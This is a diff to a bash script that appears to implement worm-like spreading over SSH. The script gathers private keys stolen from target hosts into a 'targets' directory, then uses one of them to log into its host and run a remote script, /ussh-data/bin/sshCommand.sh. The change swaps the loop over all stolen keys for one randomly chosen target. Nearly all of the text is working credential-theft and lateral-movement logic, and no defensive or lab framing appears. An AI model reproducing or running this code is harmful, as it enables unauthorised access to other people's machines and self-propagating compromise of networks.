@@ -23,8 +23,6 @@ if [ ${numHosts} -gt 0 ]; then
     numTgtUsers=${#tgtUsers[@]}
     echo -e "${hn}\t Found ${numTgtUsers} users on new target host ${tgthost}"
 
-
-
     if [ ${numTgtUsers} -gt 0 ]; then
       # Copy the first target user's private key into our target hosts directory
       tgtuser=${tgtUsers[0]}
@@ -36,8 +34,6 @@ if [ ${numHosts} -gt 0 ]; then
       fi
 
       mv ${newtargets[$i]}/privateKeys/${tgtuser} ${myHostDir}/targets/${tgthost}/${tgtuser}
-
-      
     fi
   done
 fi
@@ -46,11 +42,15 @@ targets=($(ls -d ${myHostDir}/targets/*/*))
 numtargets=${#targets[@]}
 echo -e "${hn}\t Found ${numtargets} targets"
 
-for i in "${!targets[@]}"; do
-  tgtuser=$(basename "${targets[$i]}")
-  tgthost=$(basename "$(dirname "${targets[$i]}")")
-  echo -e "${hn}\t Targeting user '${tgtuser}' on host '${tgthost}'"
+if [ ${numtargets} -eq 0 ]; then
+  echo -e "${hn}\t No targets found, exiting"
+  exit 0
+fi
 
-  ssh -i ${targets[$i]} ${tgtuser}@${tgthost} /ussh-data/bin/sshCommand.sh ${hn}
+random_target_index=$((RANDOM % numtargets))
+echo -e "${hn}\t Selected target index: ${random_target_index}"
 
-done
+tgtuser=$(basename "${targets[$random_target_index]}")
+tgthost=$(basename "$(dirname "${targets[$random_target_index]}")")
+echo -e "${hn}\t Targeting user '${tgtuser}' on host '${tgthost}'"
+ssh -i ${targets[$random_target_index]} ${tgtuser}@${tgthost} /ussh-data/bin/sshCommand.sh ${hn}
